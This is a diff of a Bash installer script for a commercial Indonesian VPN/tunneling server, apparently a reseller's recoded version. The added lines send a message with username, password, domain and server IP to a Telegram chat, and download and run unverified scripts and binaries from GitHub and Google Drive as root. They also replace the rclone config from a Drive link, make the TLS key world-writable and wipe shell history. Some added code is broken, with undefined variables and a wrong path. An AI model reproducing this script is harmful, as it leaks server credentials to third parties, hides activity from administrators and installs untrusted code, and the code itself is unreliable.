@@ -1,11 +1,10 @@
 #!/bin/bash
-LOG_FILE="/root/install_log.txt" 
-exec > >(tee -a ${LOG_FILE}) 2>&1
-name="GG"
+name="kxodpdkdbd"
 domain_input="$1"
-if [[ -z "$domain_input" ]]; then
-  echo -e "${RED}[ERROR]${NC} Penggunaan: $0 <domain|random>"
-  echo -e "Contoh: Install.sh nama domain"
+if [[ -z "$name" || -z "$domain_input" ]]; then
+  echo -e "${RED}[ERROR]${NC} Penggunaan: $0 <nama> <domain|random>"
+  echo -e "Contoh: Install.sh Newbie_Store random"
+  echo -e "        Install.sh Newbie_Store domainkeren.com"
   exit 1
 fi
 export DEBIAN_FRONTEND=noninteractive
@@ -24,10 +23,21 @@ NC='\e[0m'
 red='\e[1;31m'
 green='\e[0;32m'
 TIME=$(date '+%d %b %Y')
-MYIP=$(curl -sS ipv4.icanhazip.com)
 IP_FILE="/usr/bin/.ipvps"
-echo "$MYIP" > /usr/bin/.ipvps
+MYIP=$(curl -sL ip.dekaa.my.id)
 REPO="https://raw.githubusercontent.com/vibecodingxx/vip/main/"
+
+function Banner_Newbie {
+clear
+echo -e "${BLUE}----------------------------------------------------------"
+echo -e "  Welcome To NEWBIE VPN Script Installer Stable Edition "
+echo -e "     This Will Quick Setup VPN Server On Your Server"
+echo -e "         Auther : NEWBIEVPN [ KURNIAWAN SETIADI ]"
+echo -e "           © Recode By Newbie VPN [ 2024 ]"
+echo -e "----------------------------------------------------------${NC}"
+echo ""
+}
+Banner_Newbie
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
 echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
 else
@@ -45,7 +55,7 @@ fi
 if [[ $MYIP == "" ]]; then
 echo -e "${EROR} IP Address ( ${RED}Not Detected${NC} )"
 else
-echo -e "${OK} IP Address ( ${green}$MYIP${NC} )"
+echo -e "${OK} IP Address ( ${green}$IP${NC} )"
 fi
 echo ""
 if [ "${EUID}" -ne 0 ]; then
@@ -58,6 +68,11 @@ exit 1
 fi
 mkdir -p /etc/xray
 
+if [[ ! "$name" =~ ^[a-zA-Z0-9_.-]+$ ]]; then
+  echo -e "${RED}[ERROR]${NC} Nama tidak valid! Gunakan tanpa spasi atau karakter khusus."
+  exit 1
+fi
+
 # Simpan nama ke file
 echo "$name" > /etc/xray/username
 clear
@@ -66,10 +81,32 @@ green='\e[0;32m'
 NC='\e[0m'
 clear
 rm -f /usr/bin/user
-username="GG"
+username=$(curl $IZIN | grep $MYIP | awk '{print $2}')
 echo "$username" >/usr/bin/user
+expx=$(curl $IZIN | grep $MYIP | awk '{print $3}')
+echo "$expx" >/usr/bin/e
 username=$(cat /usr/bin/user)
+exp=$(cat /usr/bin/e)
+clear
+d1=$(date -d "$valid" +%s)
+d2=$(date -d "$today" +%s)
+certifacate=$(((d1 - d2) / 86400))
+DATE=$(date +'%Y-%m-%d')
+datediff() {
+d1=$(date -d "$1" +%s)
+d2=$(date -d "$2" +%s)
+echo -e "$COLOR1 $NC Expiry In   : $(( (d1 - d2) / 86400 )) Days"
+}
+mai="datediff "$Exp" "$DATE""
+Info="(${green}Active${NC})"
+Error="(${RED}Expired${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
+Exp1=$(curl $IZIN | grep $MYIP | awk '{print $4}')
+if [[ $today < $Exp1 ]]; then
+sts="${Info}"
+else
+sts="${Error}"
+fi
 echo -e "\e[32mloading...\e[0m"
 clear
 start=$(date +%s)
@@ -104,14 +141,13 @@ print_error "The current user is not the root user, please switch to the root us
 fi
 }
 print_install "Membuat direktori xray"
+curl -s ip.dekaa.my.id > /etc/xray/ipvps
 touch /etc/xray/domain
 mkdir -p /var/log/xray
 chown www-data.www-data /var/log/xray
 chmod +x /var/log/xray
 touch /var/log/xray/access.log
 touch /var/log/xray/error.log
-echo "$domain_input" > /etc/xray/domain
-domain=$(cat /etc/xray/domain)
 mkdir -p /var/lib/kyt >/dev/null 2>&1
 while IFS=":" read -r a b; do
 case $a in
@@ -129,15 +165,32 @@ export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/
 export Kernel=$( uname -r )
 export Arch=$( uname -m )
 function first_setup(){
-timedatectl set-timezone Asia/Kuala_Lumpur
+timedatectl set-timezone Asia/Jakarta
 echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
 echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
 print_success "Directory Xray"
+if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
+echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
 apt install haproxy -y
+elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
+echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+apt install haproxy -y
+else
+echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
+exit 1
+fi
 }
 clear
 function nginx_install() {
+if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
+print_install "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
 apt install nginx -y
+elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
+print_success "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+apt install nginx -y
+else
+echo -e " Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
+fi
 }
 function base_package() {
 clear
@@ -172,23 +225,72 @@ chronyc sourcestats -v
 chronyc tracking -v
 print_success "Packet Yang Dibutuhkan"
 }
+clear
+function pasang_domain() {
+    clear
+    echo -e "${green}Proses Menentukan Domain...${NC}"
+    sleep 1
+
+    if [[ "$domain_input" == "random" ]]; then
+        SUBDOMAIN="$(tr -dc 'a-z0-9' </dev/urandom | head -c5)"
+        host1="$SUBDOMAIN.dekaa.my.id"
+        echo -e "${green}Menggunakan random domain: $host1${NC}"
+
+        # Proses pointing subdomain
+        wget ${REPO}install/pointing.sh && chmod +x pointing.sh && ./pointing.sh
+        rm -f /root/pointing.sh
+    else
+        host1="$domain_input"
+        echo -e "${green}Menggunakan domain dari parameter: $host1${NC}"
+    fi
+    echo "$host1" > /etc/xray/domain
+    echo "$host1" > /root/domain
+    echo "IP=$host1" > /var/lib/kyt/ipvps.conf
+    sleep 1
+    clear
+}
+clear
+restart_system() {
+USRSC=$(wget -qO- $IZIN | grep $MYIP | awk '{print $2}')
+EXPSC=$(wget -qO- $IZIN | grep $MYIP | awk '{print $3}')
+TIMEZONE=$(printf '%(%H:%M:%S)T')
+TEXT="
+<code>────────────────────</code>
+<b> 🟢 NOTIFICATIONS INSTALL 🟢</b>
+<code>────────────────────</code>
+<code>user   : </code><code>$Username</code>
+<code>PW     : </code><code>$Password</code>
+<code>ID     : </code><code>$USRSC</code>
+<code>Domain : </code><code>$domain</code>
+<code>Date   : </code><code>$TIME</code>
+<code>Time   : </code><code>$TIMEZONE</code>
+<code>Ip vps : </code><code>$MYIP</code>
+<code>Exp Sc : </code><code>$EXPSC</code>
+<code>────────────────────</code>
+<i>Automatic Notification from Github</i>
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/newbie_store24"},{"text":"Contack","url":"https://wa.me/6282326322300"}]]}'
+curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
+clear
 function pasang_ssl() {
 clear
 print_install "Memasang SSL Pada Domain"
 rm -rf /etc/xray/xray.key
 rm -rf /etc/xray/xray.crt
+domain=$(cat /root/domain)
 STOPWEBSERVER=$(lsof -i:80 | awk 'NR==2 {print $1}')
 [[ -n "$STOPWEBSERVER" ]] && systemctl stop "$STOPWEBSERVER"
 ## crt xray
 systemctl stop nginx
 systemctl stop haproxy
 mkdir /root/.acme.sh
-curl https://get.acme.sh | sh -s email=fazligismail@gmail.com
+curl https://get.acme.sh | sh -s email=awanwengi64@gmail.com
 chmod +x /root/.acme.sh/acme.sh
 /root/.acme.sh/acme.sh --upgrade --auto-upgrade
 /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
 /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
 ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
+
 chmod 777 /etc/xray/xray.key
 print_success "SSL Certificate"
 }
@@ -200,6 +302,7 @@ rm -rf /etc/shadowsocks/.shadowsocks.db
 rm -rf /etc/ssh/.ssh.db
 rm -rf /etc/bot/.bot.db
 mkdir -p /etc/bot
+mkdir -p /etc/xray
 mkdir -p /etc/vmess
 mkdir -p /etc/vless
 mkdir -p /etc/trojan
@@ -218,7 +321,7 @@ mkdir -p /etc/limit/trojan
 mkdir -p /etc/limit/ssh
 mkdir -p /etc/github
 chmod +x /var/log/xray
-touch /etc/xray/
+touch /etc/xray/domain
 touch /var/log/xray/access.log
 touch /var/log/xray/error.log
 touch /etc/vmess/.vmess.db
@@ -240,7 +343,7 @@ domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
 chown www-data.www-data $domainSock_dir
 latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
 bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 24.11.30
-wget -O /etc/xray/config.json "${REPO}install/XXX.json" >/dev/null 2>&1
+wget -O /etc/xray/config.json "${REPO}install/newbie.json" >/dev/null 2>&1
 cat > /etc/systemd/system/runn.service <<EOF
 [Unit]
 Description=casper9
@@ -264,7 +367,6 @@ curl -s ipinfo.io/org?token=75082b4831f909  | cut -d " " -f 2-10 > /etc/xray/isp
 print_install "Memasang Konfigurasi Packet"
 wget -O /etc/haproxy/haproxy.cfg "${REPO}install/haproxy.cfg" >/dev/null 2>&1
 wget -O /etc/nginx/conf.d/xray.conf "${REPO}install/xray.conf" >/dev/null 2>&1
-wget ${REPO}install/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
 sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
 curl ${REPO}install/nginx.conf > /etc/nginx/nginx.conf
@@ -334,7 +436,7 @@ exit 0
 END
 chmod +x /etc/rc.local
 sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
-ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 print_success "Password SSH"
 }
@@ -403,6 +505,15 @@ systemctl enable badvpn1 badvpn2 badvpn3
 systemctl start badvpn1 badvpn2 badvpn3
 print_success "files Quota Service"
 }
+function ssh_slow(){
+clear
+print_install "Memasang modul SlowDNS Server"
+wget -q "${REPO}slowdns/installsl.sh" >/dev/null 2>&1
+chmod +x installsl.sh
+./installsl.sh | tee /root/install.log
+clear
+print_success "SlowDNS"
+}
 clear
 function ins_SSHD(){
 clear
@@ -456,6 +567,22 @@ clear
 print_install "Menginstall OpenVPN"
 wget ${REPO}install/vpn.sh &&  chmod +x vpn.sh && ./vpn.sh
 print_success "OpenVPN"
+}
+function ins_backup(){
+clear
+print_install "Memasang Backup Server"
+apt install rclone -y
+printf "q\n" | rclone config
+wget -qO /root/.config/rclone/rclone.conf "https://drive.google.com/u/4/uc?id=19BP0A8pad2tc9ELmx8JcQPxNKRWP4S6M"
+cd /bin
+git clone https://github.com/magnific0/wondershaper.git
+cd wondershaper
+sudo make install
+cd
+rm -rf wondershaper
+echo > /home/files
+wget -q ${REPO}install/ipserver && chmod +x ipserver && ./etc/ipserver
+print_success "Backup Server"
 }
 clear
 function ins_swab(){
@@ -516,11 +643,68 @@ cd
 apt autoclean -y >/dev/null 2>&1
 apt autoremove -y >/dev/null 2>&1
 print_success "ePro WebSocket Proxy"
-} 
+
+clear
+print_install "Menginstall UDP-CUSTOM"
+cd
+rm -rf /root/udp
+mkdir -p /root/udp
+
 # change to time GMT+7
 echo "change to time GMT+7"
-ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 
+# install udp-custom
+echo downloading udp-custom
+wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1_VyhL5BILtoZZTW4rhnUiYzc4zHOsXQ8' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1_VyhL5BILtoZZTW4rhnUiYzc4zHOsXQ8" -O /root/udp/udp-custom && rm -rf /tmp/cookies.txt
+chmod +x /root/udp/udp-custom
+
+echo downloading default config
+wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1_XNXsufQXzcTUVVKQoBeX5Ig0J7GngGM' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1_XNXsufQXzcTUVVKQoBeX5Ig0J7GngGM" -O /root/udp/config.json && rm -rf /tmp/cookies.txt
+chmod 644 /root/udp/config.json
+
+if [ -z "$1" ]; then
+cat <<EOF > /etc/systemd/system/udp-custom.service
+[Unit]
+Description=UDP Custom by ePro Dev. Team
+
+[Service]
+User=root
+Type=simple
+ExecStart=/root/udp/udp-custom server
+WorkingDirectory=/root/udp/
+Restart=always
+RestartSec=2s
+
+[Install]
+WantedBy=default.target
+EOF
+else
+cat <<EOF > /etc/systemd/system/udp-custom.service
+[Unit]
+Description=UDP Custom by ePro Dev. Team
+
+[Service]
+User=root
+Type=simple
+ExecStart=/root/udp/udp-custom server -exclude $1
+WorkingDirectory=/root/udp/
+Restart=always
+RestartSec=2s
+
+[Install]
+WantedBy=default.target
+EOF
+fi
+
+echo start service udp-custom
+systemctl start udp-custom &>/dev/null
+
+echo enable service udp-custom
+systemctl enable udp-custom &>/dev/null
+print_success "UDP-CUSTOM BY NEWBIE STORE VPN"
+clear
+}
 function ins_restart(){
 clear
 print_install "Restarting  All Packet"
@@ -545,6 +729,8 @@ systemctl enable --now haproxy
 systemctl enable --now netfilter-persistent
 systemctl enable --now ws
 systemctl enable --now fail2ban
+systemctl enable --now udp-custom
+#systemctl enable --NOW noobzvpns
 history -c
 echo "unset HISTFILE" >> /etc/profile
 cd
@@ -674,10 +860,12 @@ first_setup
 nginx_install
 base_package
 make_folder_xray
+password_default
 pasang_ssl
 install_xray
 ssh
 udp_mini
+ssh_slow
 ins_SSHD
 ins_dropbear
 ins_vnstat
@@ -767,8 +955,11 @@ fi
 
 # Terapkan perubahan
 sysctl -p >/dev/null 2>&1
+Banner_Newbie
+pasang_domain
+Banner_Newbie
 print_install "Proses Memasang Script Tunneling"
-instal
+fun_bar 'instal'
 print_success "Script Selesai Dipasang"
 echo ""
 history -c
@@ -779,6 +970,7 @@ rm -rf /root/LICENSE
 rm -rf /root/README.md
 rm -rf /root/domain
 rm -rf /root/*.log
+Banner_Newbie
 secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $username
 LOCAL_IP="127.0.1.1"
@@ -791,4 +983,4 @@ echo -e "\033[92m      INSTALL SUCCES      \033[0m"
 echo -e "\033[96m==========================\033[0m"
 echo -e ""
 sleep 2
-reboot
+reboot 
